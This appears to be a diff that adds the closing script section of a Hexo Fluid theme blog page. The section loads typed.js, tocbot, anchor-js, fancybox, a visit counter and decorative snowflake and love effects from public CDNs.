+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+  
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/runtime.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/DynamicLine.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/snowflake.min.js"></script>
+<script src="//cdn.jsdelivr.net/gh/EmoryHuang/BlogBeautify@1.1/love.min.js"></script>
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
